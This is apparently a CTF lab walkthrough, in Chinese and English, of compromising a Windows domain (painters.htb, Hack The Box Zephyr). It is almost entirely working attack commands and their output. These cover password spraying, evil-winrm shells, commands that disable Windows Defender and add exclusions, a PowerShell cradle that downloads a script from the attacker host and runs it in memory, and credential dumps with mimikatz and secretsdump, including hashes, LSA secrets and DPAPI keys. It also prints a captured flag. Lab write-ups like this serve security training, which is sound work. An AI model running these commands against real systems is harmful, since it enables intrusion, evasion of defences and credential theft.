┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q nxc winrm 192.168.110.1/24 -u web_svc -p '!QAZ1qaz'
WINRM       192.168.110.55  5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:painters.htb)
WINRM       192.168.110.53  5985   PNT-SVRBPA       [*] Windows Server 2022 Build 20348 (name:PNT-SVRBPA) (domain:painters.htb)
WINRM       192.168.110.52  5985   PNT-SVRSVC       [*] Windows Server 2022 Build 20348 (name:PNT-SVRSVC) (domain:painters.htb)
WINRM       192.168.110.56  5985   WORKSTATION-1    [*] Windows 10 / Server 2019 Build 19041 (name:WORKSTATION-1) (domain:painters.htb)
WINRM       192.168.110.54  5985   PNT-SVRPSB       [*] Windows Server 2022 Build 20348 (name:PNT-SVRPSB) (domain:painters.htb)

WINRM       192.168.110.55  5985   DC               [-] painters.htb\web_svc:!QAZ1qaz

WINRM       192.168.110.53  5985   PNT-SVRBPA       [-] painters.htb\web_svc:!QAZ1qaz

WINRM       192.168.110.52  5985   PNT-SVRSVC       [+] painters.htb\web_svc:!QAZ1qaz (Pwn3d!)

WINRM       192.168.110.56  5985   WORKSTATION-1    [-] painters.htb\web_svc:!QAZ1qaz

WINRM       192.168.110.54  5985   PNT-SVRPSB       [-] painters.htb\web_svc:!QAZ1qaz
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

## evil-winrm
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q evil-winrm -i 192.168.110.52 -u 'web_svc' -p '!QAZ1qaz'    
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\web_svc\Documents>
```

## whoami
```plain
*Evil-WinRM* PS C:\Users\web_svc\Documents> whoami
painters\web_svc
```

### /groups
```plain
*Evil-WinRM* PS C:\Users\web_svc\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ===============================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators               Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
```

### /priv
```plain
*Evil-WinRM* PS C:\Users\web_svc\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

## Getflag
```plain
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
ZEPHYR{S3rV1c3_AcC0Un7_5PN_Tr0uBl35}
```

## smbexec
```plain
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# proxychains -q smbexec.py web_svc:'!QAZ1qaz'@192.168.110.52                         
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

## 关闭防护
```plain
powershell -ep bypass -nop -c "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableScriptScanning $true"
```

```plain
# 检查防篡改保护状态
Get-MpComputerStatus | Select-Object IsTamperProtected

# 如果开启了防篡改，你需要SYSTEM权限。可以使用PsExec或创建一个服务：
# 上传PsExec或使用sc.exe创建一个以SYSTEM身份运行的服务
sc.exe create TempSvc binPath= "cmd.exe /c powershell -ep bypass -c \"Set-MpPreference -DisableRealtimeMonitoring `$true\"" start= demand
sc.exe start TempSvc
```

## 添加排除路径
```plain
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public'"
```

## Sharphound(失败)
> 失败原因：该账户为服务账户
>

### upload-exe(失败)
```plain
*Evil-WinRM* PS C:\Users\Public> upload /home/kali/Desktop/tools/sharphound/SharpHound-v2.5.7/SharpHound.exe 
                                        
Info: Uploading /home/kali/Desktop/tools/sharphound/SharpHound-v2.5.7/SharpHound.exe to C:\Users\Public\SharpHound.exe                                                                                                                
                                        
Data: 3104084 bytes of 3104084 bytes copied

*Evil-WinRM* PS C:\Users\Public> dir


    Directory: C:\Users\Public


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---        12/30/2021   9:35 PM                Documents
d-r---          5/8/2021   9:15 AM                Downloads
d-r---          5/8/2021   9:15 AM                Music
d-r---          5/8/2021   9:15 AM                Pictures
d-r---          5/8/2021   9:15 AM                Videos
-a----         3/20/2026   1:56 PM        1250056 mimikatz.exe
-a----         3/20/2026   3:54 PM        2328064 SharpHound.exe
```

体积小了很多，上传的exe已经不可用了

### ps1-内存加载(失败)
```plain
IEX (IWR "http://10.10.16.8/SharpHound.ps1" -UseBasicParsing).Content; Invoke-BloodHound -CollectionMethod All -OutputDirectory "C:\Users\Public" -ZipFileName "bh.zip"
```

```plain
*Evil-WinRM* PS C:\Users\Public> IEX (IWR "http://10.10.16.8/SharpHound.ps1" -UseBasicParsing).Content; Invoke-BloodHound -CollectionMethod All -OutputDirectory "C:\Users\Public" -ZipFileName "bh.zip"
Cannot convert 'System.Byte[]' to the type 'System.String' required by parameter 'Command'. Specified method is not supported.
At line:1 char:5
+ IEX (IWR "http://10.10.16.8/SharpHound.ps1" -UseBasicParsing).Content ...
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidArgument: (:) [Invoke-Expression], ParameterBindingException
    + FullyQualifiedErrorId : CannotConvertArgument,Microsoft.PowerShell.Commands.InvokeExpressionCommand
The term 'Invoke-BloodHound' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:72
+ ... /SharpHound.ps1" -UseBasicParsing).Content; Invoke-BloodHound -Collec ...
+                                                 ~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Invoke-BloodHound:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
```

### ps1-落地磁盘(失败)
```plain
*Evil-WinRM* PS C:\Users\Public> IWR "http://10.10.16.8/SharpHound.ps1" -UseBasicParsing -OutFile "C:\Users\Public\SharpHound.ps1"; . "C:\Users\Public\SharpHound.ps1"; Invoke-BloodHound -CollectionMethod All -OutputDirectory "C:\Users\Public" -ZipFileName "bh.zip"
```

#### 失败-DNS解析
```plain
*Evil-WinRM* PS C:\Users\Public> powershell -ep bypass -c "Import-Module .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All"
2026-03-20T16:06:56.4824730+00:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2026-03-20T16:06:56.6074856+00:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices
2026-03-20T16:06:56.6387227+00:00|INFORMATION|Initializing SharpHound at 16:06 on 20/03/2026
2026-03-20T16:06:56.6543447+00:00|INFORMATION|Resolved current domain to painters.htb
2026-03-20T16:06:56.6856054+00:00|INFORMATION|[CommonLib LdapConnectionPool]We will not be able to connect to domain painters.htb by any strategy, leaving it.
System.DirectoryServices.Protocols.DirectoryOperationException: An operation error occurred.
   at System.DirectoryServices.Protocols.LdapConnection.ConstructResponse(Int32 messageId, LdapOperation operation, ResultAll resultType, TimeSpan requestTimeOut, Boolean exceptionOnTimeOut)
   at System.DirectoryServices.Protocols.LdapConnection.SendRequest(DirectoryRequest request, TimeSpan requestTimeout)
   at SharpHoundCommonLib.LdapConnectionPool.TestLdapConnection(LdapConnection connection, LdapConnectionTestResult& testResult)
   at SharpHoundCommonLib.LdapConnectionPool.CreateLdapConnection(String target, Boolean globalCatalog, LdapConnectionWrapper& connection)
   at SharpHoundCommonLib.LdapConnectionPool.<CreateNewConnection>d__28.MoveNext()
2026-03-20T16:06:56.6856054+00:00|ERROR|Unable to connect to LDAP: All attempted connections failed
```

#### 失败- LDAP连接
```plain
*Evil-WinRM* PS C:\Users\Public> powershell -ep bypass -c "Import-Module C:\Users\Public\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -Domain painters.htb -DomainController DC.painters.htb -OutputDirectory C:\Users\Public -ZipFileName bh.zip"
2026-03-20T16:16:03.6839241+00:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2026-03-20T16:16:03.8089947+00:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices
2026-03-20T16:16:03.8401738+00:00|INFORMATION|Initializing SharpHound at 16:16 on 20/03/2026
2026-03-20T16:16:03.9026764+00:00|INFORMATION|[CommonLib LdapConnectionPool]We will not be able to connect to domain painters.htb by any strategy, leaving it.
System.DirectoryServices.Protocols.DirectoryOperationException: An operation error occurred.
   at System.DirectoryServices.Protocols.LdapConnection.ConstructResponse(Int32 messageId, LdapOperation operation, ResultAll resultType, TimeSpan requestTimeOut, Boolean exceptionOnTimeOut)
   at System.DirectoryServices.Protocols.LdapConnection.SendRequest(DirectoryRequest request, TimeSpan requestTimeout)
   at SharpHoundCommonLib.LdapConnectionPool.TestLdapConnection(LdapConnection connection, LdapConnectionTestResult& testResult)
   at SharpHoundCommonLib.LdapConnectionPool.CreateLdapConnection(String target, Boolean globalCatalog, LdapConnectionWrapper& connection)
   at SharpHoundCommonLib.LdapConnectionPool.CreateNewConnectionForServer(String identifier, Boolean globalCatalog)
   at SharpHoundCommonLib.LdapConnectionPool.<CreateNewConnection>d__28.MoveNext()
2026-03-20T16:16:03.9026764+00:00|ERROR|Unable to connect to LDAP: All attempted connections failed
```

#### 失败- LDAP连接
```plain
*Evil-WinRM* PS C:\Users\Public> powershell -ep bypass -c "Import-Module C:\Users\Public\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -Domain painters.htb -DomainController 192.168.110.55 -OutputDirectory C:\Users\Public -ZipFileName bh.zip"
2026-03-20T16:16:33.9807125+00:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2026-03-20T16:16:34.1057248+00:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices
2026-03-20T16:16:34.1213366+00:00|INFORMATION|Initializing SharpHound at 16:16 on 20/03/2026
2026-03-20T16:16:34.1838467+00:00|INFORMATION|[CommonLib LdapConnectionPool]We will not be able to connect to domain painters.htb by any strategy, leaving it.
System.DirectoryServices.Protocols.DirectoryOperationException: An operation error occurred.
   at System.DirectoryServices.Protocols.LdapConnection.ConstructResponse(Int32 messageId, LdapOperation operation, ResultAll resultType, TimeSpan requestTimeOut, Boolean exceptionOnTimeOut)
   at System.DirectoryServices.Protocols.LdapConnection.SendRequest(DirectoryRequest request, TimeSpan requestTimeout)
   at SharpHoundCommonLib.LdapConnectionPool.TestLdapConnection(LdapConnection connection, LdapConnectionTestResult& testResult)
   at SharpHoundCommonLib.LdapConnectionPool.CreateLdapConnection(String target, Boolean globalCatalog, LdapConnectionWrapper& connection)
   at SharpHoundCommonLib.LdapConnectionPool.CreateNewConnectionForServer(String identifier, Boolean globalCatalog)
   at SharpHoundCommonLib.LdapConnectionPool.<CreateNewConnection>d__28.MoveNext()
2026-03-20T16:16:34.1838467+00:00|ERROR|Unable to connect to LDAP: All attempted connections failed
```

## bloodhound-python
### web_svc
```plain
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/zephyr/blood]
└─# proxychains -q bloodhound-python -u 'web_svc' -p '!QAZ1qaz' -d 'painters.htb' -dc 'DC.painters.htb' -ns 192.168.110.55 --dns-tcp -c All

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: painters.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (DC.painters.htb:88)] [Errno 111] Connection refused
INFO: Connecting to LDAP server: DC.painters.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 6 computers
INFO: Connecting to GC LDAP server: dc.painters.htb
INFO: Connecting to LDAP server: DC.painters.htb
INFO: Found 11 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WORKSTATION-1.painters.htb
INFO: Querying computer: Maintenance.painters.htb
INFO: Querying computer: PNT-SVRPSB.painters.htb
INFO: Querying computer: PNT-SVRBPA.painters.htb
INFO: Querying computer: PNT-SVRSVC.painters.htb
INFO: Querying computer: DC.painters.htb
INFO: Done in 01M 40S
```

### riley
```plain
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/zephyr/blood]
└─# proxychains -q bloodhound-python -u 'riley' -p 'P@ssw0rd' -d 'painters.htb' -dc 'DC.painters.htb' -ns 192.168.110.55 --dns-tcp -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: painters.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (DC.painters.htb:88)] [Errno 111] Connection refused
INFO: Connecting to LDAP server: DC.painters.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 6 computers
INFO: Connecting to GC LDAP server: dc.painters.htb
INFO: Connecting to LDAP server: DC.painters.htb
INFO: Found 11 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WORKSTATION-1.painters.htb
INFO: Querying computer: Maintenance.painters.htb
INFO: Querying computer: PNT-SVRPSB.painters.htb
INFO: Querying computer: PNT-SVRBPA.painters.htb
INFO: Querying computer: PNT-SVRSVC.painters.htb
INFO: Querying computer: DC.painters.htb
INFO: Done in 01M 23S
```

## mimikatz
### upload
```plain
*Evil-WinRM* PS C:\Users\Public> upload /home/kali/Desktop/tools/mimikatz/x64/mimikatz.exe mimikatz.exe
                                        
Info: Uploading /home/kali/Desktop/tools/mimikatz/x64/mimikatz.exe to C:\Users\Public\mimikatz.exe
                                        
Data: 1666740 bytes of 1666740 bytes copied
                                        
Info: Upload successful!
```

### sekurlsa::logonpasswords(失败)
```plain
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# proxychains -q smbexec.py web_svc:'!QAZ1qaz'@192.168.110.52
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>C:\Users\Public\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list

mimikatz(commandline) # exit
Bye!
```

> 在 Windows Server 2022：
>
> 👉 默认开启：
>
> LSASS Protection（RunAsPPL）-> LSASS 变成受保护进程
>
> 👉 导致：
>
> + ❌ mimikatz 不能直接读取内存
> + ❌ sekurlsa 失败
>

### lsadump::sam
```plain
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# proxychains -q smbexec.py web_svc:'!QAZ1qaz'@192.168.110.52
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>C:\Users\Public\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::sam
Domain : PNT-SVRSVC
SysKey : b131ea5c8206a94e3d32119d035961a9
Local SID : S-1-5-21-1894836871-1209905952-3336604744

SAMKey : 21027b48a361fb0094c6eb79509e228d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 6ee87fa6593a4798fe651f5f5a4e663e

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 9a3896a66cc19131b074f0463d56587c

* Primary:Kerberos-Newer-Keys *
    Default Salt : PNT-SVRSVC.PAINTERS.HTBAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : e2638a592bf8df16ae7a16d5f1e0ff945af694ea1cb0c96cc718f30371677dd7
      aes128_hmac       (4096) : 3e2a98999ef9cef8c1e41928257487c9
      des_cbc_md5       (4096) : fb64f42680042c52
    OldCredentials
      aes256_hmac       (4096) : 5c0ecc5dccd087cac3ec672f714c2119ab655a9f0b6b51bf75da22179dfee76a
      aes128_hmac       (4096) : d6477c485507bb6f1454cedc0af950f6
      des_cbc_md5       (4096) : ab7fe0ece5b67c5d
    OlderCredentials
      aes256_hmac       (4096) : cb7a55cfd2a867b40baa0f8148f327afce1b1b70e07a49ceecb33d3b379d42ce
      aes128_hmac       (4096) : da4f9d36f93e1c0af67f8af0805ff692
      des_cbc_md5       (4096) : e3fb1c49927a891c

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : PNT-SVRSVC.PAINTERS.HTBAdministrator
    Credentials
      des_cbc_md5       : fb64f42680042c52
    OldCredentials
      des_cbc_md5       : ab7fe0ece5b67c5d


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount

RID  : 000003e9 (1001)
User : James
  Hash NTLM: 8af1903d3c80d3552a84b6ba296db2ea

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : e159b53fdb4574ab6bed0660156ffcc6

* Primary:Kerberos-Newer-Keys *
    Default Salt : SVC.PAINTERS.HTBJames
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : ab256c5e77a17fc0234eeada495d8ea573b2c3e90d9e5d24d2dba7d4e9792c23
      aes128_hmac       (4096) : 8d68c286c5716ed9213092b1281f24c5
      des_cbc_md5       (4096) : 1f54a21c86cbd6ef

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : SVC.PAINTERS.HTBJames
    Credentials
      des_cbc_md5       : 1f54a21c86cbd6ef


mimikatz(commandline) # exit
Bye!
```

## secretsdump
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q impacket-secretsdump 'painters.htb/web_svc:!QAZ1qaz@192.168.110.52'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xb131ea5c8206a94e3d32119d035961a9
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6ee87fa6593a4798fe651f5f5a4e663e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
James:1001:aad3b435b51404eeaad3b435b51404ee:8af1903d3c80d3552a84b6ba296db2ea:::
[*] Dumping cached domain logon information (domain/username:hash)
PAINTERS.HTB/Administrator:$DCC2$10240#Administrator#4f3d8c09f46360e84463d125c240c554: (2024-12-11 15:06:55+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
PAINTERS\PNT-SVRSVC$:aes256-cts-hmac-sha1-96:a31b4a0de42a441e47dad46f283105a9eeaf023831336cf2b2933c2907a63c4a
PAINTERS\PNT-SVRSVC$:aes128-cts-hmac-sha1-96:0f5239792536fef683f21de1925b8ca4
PAINTERS\PNT-SVRSVC$:des-cbc-md5:9e89f79eb37f1fcb
PAINTERS\PNT-SVRSVC$:plain_password_hex:9c2295062db39652dd63b214344ce839af0ab487e64efc62923556fd6515e24f383f0f9a34006bae1f108446483b2e8c54a2d0bd08388b0e47dc12ad75a1859c45c917072bb683477e379108ff3131bcb52a4d4a2046c6c6f6252945e4b4e3c465a33a379854b4771e7cec30db10df8990bb0867c826c50d8d0646d4f817d70becbf98058e81d6a5b0f606263ea3c6495ff553bef55ee6fe109d03e5237ad0061f9ed7f0694d5c9be2a87379b82491871df259d251ff8a114d76961009551f53a5abaa1d51d7aa1d06d6e730a1a14797d33f71c3690eea3a00a09711f2053872d9dc815e3de06808e6b681c737cc9e33
PAINTERS\PNT-SVRSVC$:aad3b435b51404eeaad3b435b51404ee:c206d294c947cecc0e60955004ff96c5:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6a28296d276ce0627958e99cfbcab0b54ff64355
dpapi_userkey:0xaf502a3258e233f29ce3ca24257f5877965bb87d
[*] NL$KM 
 0000   48 6D D8 24 3E D2 25 7B  96 58 D1 98 1B 7A E3 57   Hm.$>.%{.X...z.W
 0010   79 5B C9 17 D2 E7 E7 1A  F9 48 B4 9F D8 6D 1E A8   y[.......H...m..
 0020   F8 9B 47 1C B9 E3 B2 E1  CE FC 2C 92 48 01 39 25   ..G.......,.H.9%
 0030   A3 AA D4 45 A3 F4 A5 A8  4B 9B DE 1F 86 A7 5B B7   ...E....K.....[.
NL$KM:486dd8243ed2257b9658d1981b7ae357795bc917d2e7e71af948b49fd86d1ea8f89b471cb9e3b2e1cefc2c9248013925a3aad445a3f4a5a84b9bde1f86a75bb7
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

拿到凭据James:1001:aad3b435b51404eeaad3b435b51404ee:8af1903d3c80d3552a84b6ba296db2ea:::

>  它不是读内存，而是：  
>
>  方式1：远程 SAM / SYSTEM  
>
> 读取注册表：
>
> 1. HKLM\SAM
> 2. HKLM\SYSTEM
>
>  方式2：域控  
>
> NTDS.dit（AD数据库）
>
> 这些是：❗ **磁盘上的数据，不受 LSASS 保护**
>

## netexec-james
### SMB-域用户
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q nxc smb 192.168.110.1/24 -u James -H 8af1903d3c80d3552a84b6ba296db2ea             
SMB         192.168.110.53  445    PNT-SVRBPA       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRBPA) (domain:painters.htb) (signing:False) (SMBv1:None)
SMB         192.168.110.52  445    PNT-SVRSVC       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRSVC) (domain:painters.htb) (signing:False) (SMBv1:None)
SMB         192.168.110.55  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:painters.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.110.53  445    PNT-SVRBPA       [-] painters.htb\James:8af1903d3c80d3552a84b6ba296db2ea STATUS_LOGON_FAILURE
SMB         192.168.110.52  445    PNT-SVRSVC       [-] painters.htb\James:8af1903d3c80d3552a84b6ba296db2ea STATUS_LOGON_FAILURE
SMB         192.168.110.55  445    DC               [-] painters.htb\James:8af1903d3c80d3552a84b6ba296db2ea STATUS_LOGON_FAILURE
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

### SMB-本地用户
> --local-auth   目标机器本地认证  
>

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q nxc smb 192.168.110.1/24 -u James -H 8af1903d3c80d3552a84b6ba296db2ea --local-auth          
SMB         192.168.110.55  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:DC) (signing:True) (SMBv1:None) (Null Auth:True)                                                                        
SMB         192.168.110.53  445    PNT-SVRBPA       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRBPA) (domain:PNT-SVRBPA) (signing:False) (SMBv1:None)
SMB         192.168.110.52  445    PNT-SVRSVC       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRSVC) (domain:PNT-SVRSVC) (signing:False) (SMBv1:None)
SMB         192.168.110.55  445    DC               [-] DC\James:8af1903d3c80d3552a84b6ba296db2ea STATUS_LOGON_FAILURE
SMB         192.168.110.53  445    PNT-SVRBPA       [+] PNT-SVRBPA\James:8af1903d3c80d3552a84b6ba296db2ea (Pwn3d!)
SMB         192.168.110.52  445    PNT-SVRSVC       [-] PNT-SVRSVC\James:8af1903d3c80d3552a84b6ba296db2ea STATUS_PASSWORD_EXPIRED
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

# PNT-SVRBPA\James-192.168.110.53
## netexec-james
### netexec-smb
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q nxc smb 192.168.110.53 -u James -H 8af1903d3c80d3552a84b6ba296db2ea --local-auth
SMB         192.168.110.53  445    PNT-SVRBPA       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRBPA) (domain:PNT-SVRBPA) (signing:False) (SMBv1:None)
SMB         192.168.110.53  445    PNT-SVRBPA       [+] PNT-SVRBPA\James:8af1903d3c80d3552a84b6ba296db2ea (Pwn3d!)
```

### netexec-winrm
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q nxc winrm 192.168.110.53 -u James -H 8af1903d3c80d3552a84b6ba296db2ea --local-auth
WINRM       192.168.110.53  5985   PNT-SVRBPA       [*] Windows Server 2022 Build 20348 (name:PNT-SVRBPA) (domain:painters.htb)
WINRM       192.168.110.53  5985   PNT-SVRBPA       [+] PNT-SVRBPA\James:8af1903d3c80d3552a84b6ba296db2ea (Pwn3d!)
```

## evil-winrm
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q evil-winrm -i 192.168.110.53 -u 'James' -H '8af1903d3c80d3552a84b6ba296db2ea'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                      
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                 
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\James\Documents>
```

## Getflag
```plain
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
